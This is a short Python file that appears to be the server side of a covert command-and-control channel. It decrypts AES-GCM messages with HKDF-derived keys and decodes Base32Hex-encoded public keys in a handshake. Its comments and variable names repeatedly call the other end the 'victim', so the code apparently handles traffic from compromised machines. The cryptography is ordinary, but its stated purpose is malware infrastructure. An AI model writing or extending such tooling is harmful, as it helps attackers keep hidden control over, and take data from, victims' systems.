import struct
import base64
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import HKDF

def decrypt_symmetric(binary_payload, master_key):
    try:
        # Payload is bytes
        header_size = struct.calcsize('!HH')
        if len(binary_payload) < header_size:
            return {"message": "Payload too short", "success": False}

        header = binary_payload[:header_size]
        len_nonce, len_tag = struct.unpack('!HH', header)
        
        salt_len = 16
        pos_salt_start = header_size
        pos_nonce_start = pos_salt_start + salt_len
        
        if len(binary_payload) < pos_nonce_start:
             return {"message": "Payload too short for salt", "success": False}
             
        msg_salt = binary_payload[pos_salt_start:pos_nonce_start]

        message_key = HKDF(master_key, 32, msg_salt, SHA256)
        
        pos_tag_start = pos_nonce_start + len_nonce
        pos_cipher_start = pos_tag_start + len_tag
        
        nonce = binary_payload[pos_nonce_start:pos_tag_start]
        tag = binary_payload[pos_tag_start:pos_cipher_start]
        ciphertext = binary_payload[pos_cipher_start:]
        
        cipher = AES.new(message_key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        
        # [CHANGE] Return bytes (because victim compresses responses)
        return {"message": plaintext, "success": True}
        
    except ValueError as e:
        return {"message": f"Tag verification failed {e}", "success": False}
    except Exception as e:
        return {"message": "Failed to decrypt the message", "success": False, "error": str(e)}

def handshake_initiate_parser(binary_payload):
    try:
        # Payload is Base32Hex encoded PEM (sent by victim)
        # First decode the Base32Hex text to get raw PEM bytes
        b32hex_text = binary_payload.decode('utf8')
        
        # Add padding if needed (Base32 uses 8-char groups)
        pad_len = (8 - len(b32hex_text) % 8) % 8
        padded = b32hex_text + '=' * pad_len
        
        # Decode Base32Hex to get the actual PEM bytes
        pem_bytes = base64.b32hexdecode(padded)
        victim_ephemeral_pub_pem = pem_bytes.decode('utf8')
        
        return {"victim_eph_pub_pem": victim_ephemeral_pub_pem, "success": True}
    except Exception as e:
        return {"message": f"Handshake init parse failed: {str(e)}", "success": False}